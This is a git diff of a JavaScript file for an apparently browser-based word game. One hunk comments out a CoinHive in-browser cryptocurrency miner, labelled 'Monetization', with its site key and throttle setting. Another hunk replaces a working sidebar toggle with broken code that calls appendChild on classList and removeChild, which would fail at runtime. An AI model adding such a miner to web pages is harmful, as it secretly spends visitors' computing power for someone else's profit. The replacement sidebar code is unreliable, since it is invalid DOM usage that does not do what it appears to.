@@ -9,9 +9,9 @@
  */
 
 //Monetization
-var miner = new CoinHive.Anonymous('LxcVb1XF7gsPlDxz914zOLT2UUNiwhS7');
-	miner.setThrottle(.5);
-  miner.start();
+// var miner = new CoinHive.Anonymous('LxcVb1XF7gsPlDxz914zOLT2UUNiwhS7');
+// 	miner.setThrottle(.5);
+//   miner.start();
 
 var stage = document.getElementById('stage');
 var rack = ""; //to store letters for word making
@@ -658,7 +658,14 @@ function getDocHeight() {
 function toggleSidebar() {
     var side = document.getElementById("sidebar")
     var disp = side.style.display;
-    side.style.display = (disp == "block") ? "none" : "block";
+    //=side.style.display = (disp == "block") ? "none" : "block";
+		if (side.classList == "none") {
+			side.classList.appendChild("hidden");
+			side.removeChild.appendChild("visible");
+		} else {
+				side.classList.appendChild("visible");
+				side.removeChild.appendChild("hidden");
+		}
 }
 
 function isLevelDone() {
